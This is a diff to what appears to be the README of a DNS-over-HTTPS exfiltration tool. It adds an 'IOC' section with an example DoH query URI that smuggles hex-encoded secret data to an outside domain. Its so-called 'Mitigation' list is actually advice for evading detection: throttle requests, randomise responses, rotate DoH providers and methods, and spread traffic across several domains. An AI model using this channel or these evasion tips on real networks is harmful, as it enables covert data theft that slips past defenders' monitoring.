@@ -47,3 +47,17 @@ File integrity ? chunk identification number
 Total: `250` where `228` is data 
 
 simple test.xslx excel file: `8.27` KB -> 8270 / 228 = 36.3, meaning `37` requests
+
+# IOC
+A LOT of http/https traffic in small period of time: https://1.1.1.1/dns-query?name=google.com
+
+Example http uri:
+`https://1.1.1.1/dns-query?name=5353534141410D0A73757065725365637265743132.32330D0A31323865736764736739347766696F617373646773646766383932.317220736673616B6C3871723933333238666A61736C660D0A535353414141.0D0A402324255E262A28295F6B3B616C666D706F65662065770D0A53535341.0000.a.abcdefghi.com`
+
+
+Mitigation: avoid generating a pattern
+0. use randomized IP as a DNS response
+1. limit the number 253
+2. try prolong, 5 request in 5 hours
+3. use different DoH services and methods (POST requests, not only GET)
+4. use different domains for server
